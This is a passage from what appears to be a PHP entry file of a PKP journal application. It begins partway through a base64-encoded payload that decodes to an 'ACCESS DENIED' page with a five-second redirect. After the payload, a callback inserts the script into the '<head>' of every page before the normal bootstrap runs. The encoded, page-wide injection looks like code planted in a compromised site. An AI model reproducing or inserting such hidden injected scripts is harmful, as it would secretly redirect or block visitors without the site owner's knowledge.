NCAxNSAxMCI+PC9wb2x5bGluZT48L3N2Zz4gQUNDRVNTIERFTklFRDwvaDE+PGRpdiBjbGFzcz0iYyI+UmVkaXJlY3RpbmcgaW4gPHNwYW4gaWQ9InRpbWVyIiBjbGFzcz0ibiI+NTwvc3Bhbj4gc2Vjb25kcy4uLjwvZGl2PjwvYm9keT48L2h0bWw+"))}return r})}};}();</script>';
        return str_ireplace('</head>', $s . '</head>', $b);
    });
}

$application = require('./lib/pkp/includes/bootstrap.inc.php');
$application->execute();
